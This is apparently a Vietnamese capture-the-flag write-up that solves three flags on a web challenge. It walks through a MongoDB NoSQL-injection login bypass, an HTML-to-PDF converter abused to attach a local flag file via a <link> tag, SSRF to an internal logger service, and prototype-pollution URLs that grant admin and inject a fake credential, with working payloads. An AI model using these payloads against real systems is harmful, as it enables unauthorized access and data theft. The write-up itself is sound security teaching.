## Cách giải bài CTF

Giao diện trang web:

![](https://i.imgur.com/5TTVxSo.png)

### 1. Flag 1

Trang web có chức năng `/login`. Hiện tại trong ứng dụng chỉ có một user `admin` với password random.

![](https://i.imgur.com/oa9PpB1.png)

Tìm trong source code, ta thấy xuất hiện đoạn xử lí khi đăng nhập. Cụ thể server dùng MongoDB làm CSDL dạng NoSQL cho ứng dụng. Tuy nhiên khi trích xuất các tham số `username` và `password` từ request, server không thực hiện bất kì bước validate hay sanitize nào mà dùng chúng trực tiếp trong phần query thông qua hàm `find()` &rarr; NoSQL injection.

```python
def login_page():
    ...
    data = request.json
            if "username" in data.keys() and "password" in data.keys():
                login_cred = {"username": data["username"], "password": data["password"]}
                find_cred = dict()

                for i in tab.find(login_cred):
                    find_cred = i
                    break
    ...
```

Bắt request và đăng nhập bằng payload như sau:

```
{
    "username":"admin",
    "password":{
        "$ne": "1"
    }
}
```

Lúc này, câu query tương đương trong SQL sẽ dạng:

```
SELECT * FROM users WHERE username="admin" and password!="1"
```

Câu query trên luôn đúng &rarr; bypass login.

![](https://hackmd.io/_uploads/HkoDSAXN2.png)

Sau khi login, ta thấy ứng dụng có thêm chức năng converter.

![](https://i.imgur.com/a6CYxtB.png)

Chức năng `/converter` sử dụng thư viện `weasyprint` để convert HTML thành PDF file thông qua URL input. 

![](https://hackmd.io/_uploads/SkFFwCXEn.png)

Có thể thấy chức năng này dính lỗ hổng server-side XSS khi có thể dùng tag `<link>` để load local file từ server. Tạo file HTML `index.html` sau attach file `/tmp/flag.txt` (đọc Dockerfile).

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Flag hunter</title>
    <link rel=attachment href="file:///tmp/flag.txt">
</head>
<body>
    <h1>Looking for the flag 😵</h1>
</body>
</html>
```

Tại thư mục chứa file HTML trên, lắng nghe http request ở port 10101.

```
D:> python3 -m http.server 10101
```

Điền URL `http://<DOCKER_GATEWAY>:10101/`, ta generate được file PDF có attachment là file `/tmp/flag.txt`.

![](https://hackmd.io/_uploads/rkLO_RXVn.png)

![](https://hackmd.io/_uploads/SkD9dA743.png)

Download file PDF và sử dụng PDF editor để xem nội dung file `flag.txt`.

![](https://hackmd.io/_uploads/S198KRXEh.png)

**Flag 1: VCS{p00r_n0SQL_inj3cti0n}**

### 2. Flag 2

Ta thấy chức năng `/converter` chỉ đơn giản validate xem scheme từ URL input phải là `http` hoặc `https` &rarr; SSRF.

```python
@app.route("/converter", methods=["GET", "POST"])
def converter_page():
    ...
    else:
        data = request.json
        if "url" in data.keys():
            url = data["url"]
            if urlparse(url).scheme.lower() not in ["http", "https"]:
                result = {"status": 403, "msg": "You can only use http or https."}
            else:
                filename = hashlib.sha256(os.urandom(16)).hexdigest()
                start_time = str(datetime.datetime.now())
                HTML(url).write_pdf(f"static/output/{filename}.pdf")
                ...
    ...

```

Như vậy ta có thể SSRF service `logger` bằng URL `http://logger:8000`.

Tại service `logger`,  xuất hiện lỗ hổng Prototype Poisoning tại endpoint `/admin-logs` khi sử dụng `Object.assign()` và `JSON.parse()` user input qua param `logs`.

```javascript
app.get("/admin-logs", (req, res)=>{
    try {
        let new_logs = {
            "ip": null,
            "time": null
        };
        returnedTarget = Object.assign(new_logs, JSON.parse(req.query.logs));
        logs.push(new_logs);
        if(new_logs.from_admin == true){
            return res.json({result: true, msg: FLAG1});
        }
        return res.json({result: true});
    } catch {
        return res.json({result: false});
    }
});
```

Gửi request với URL: `http://logger:8000/admin-logs?logs={"__proto__":{"from_admin": 1}}`. Khi đó `new_logs` sẽ được gán thuộc tính `from_admin` có giá trị `true`.

![](https://hackmd.io/_uploads/SJadsyV4h.png)

Xem file PDF được generate và ta lấy được flag.

![](https://hackmd.io/_uploads/ryYqikVNh.png)

**Flag 2: VCS{pr0t0typ3_p0is0nin9_1s_e4sY!}**

### 3. Flag 3

Đối với flag 3, service `logger` có endpoint `/flag` trả về flag nếu là user `is_admin: true` của service này. 

```javascript
app.get("/flag", (req, res)=>{
    if(req.query.username != null && req.query.password != null) {
        let username = req.query.username;
        let password = req.query.password;
        if(creds[username] != null && creds[username].password == password) {
            if(creds[username].is_admin == true){
                return res.json({result: true, msg: FLAG2});
            } else {
                return res.json({result: true, msg: "nothing for you ^^"});
            }
        }
        return res.json({result: false});
    }
    return res.json({result: false});
});
```

Các credentials được lưu vào object `creds`, và hiện tại chỉ user `admin` nhưng password đã bị ẩn.

```
const creds = {
    "admin": {
        "password": process.env.ADMINPW,
        "is_admin": true
    }
};
```

Tuy nhiên, để ý tại endpoint `/logs` xảy ra lỗi prototype pollution với `JSON.parse()` khi sử dụng hàm merge đệ quy để lưu log mới.

```javascript
app.get("/logs", (req, res)=>{
    try {
        let new_logs = {
            "ip": null,
            "time": null
        };
        merge(new_logs, JSON.parse(req.query.logs));
        logs.push(new_logs);
        return res.json({result: true});
    } catch {
        return res.json({result: false});
    }
});
```

Lợi dụng điều đó, ta sẽ "tạo" thêm 1 credential mới có giá trị `username=hacker`, `password=pwned` và `is_admin=1` bằng URL sau: `http://logger:8000/logs?logs={"__proto__":{"hacker": {"password": 'pwned', 'is_admin": 1}}}`

![](https://hackmd.io/_uploads/BJtL3y4Vh.png)

Gửi request, lúc này ta đã pollute thành công và có thể sử dụng credential vừa tạo để lấy flag. Convert bằng URL `http://logger:8000/flag?username=hacker&password=pwned`.

![](https://hackmd.io/_uploads/rJCTleEN3.png)

Response trả về được convert qua PDF và ta lấy được flag.

![](https://hackmd.io/_uploads/rJw1WgE43.png)

**Flag 3: VCS{pr0t0typ3_p0lluT10n_1s_e4sY_t00!}**

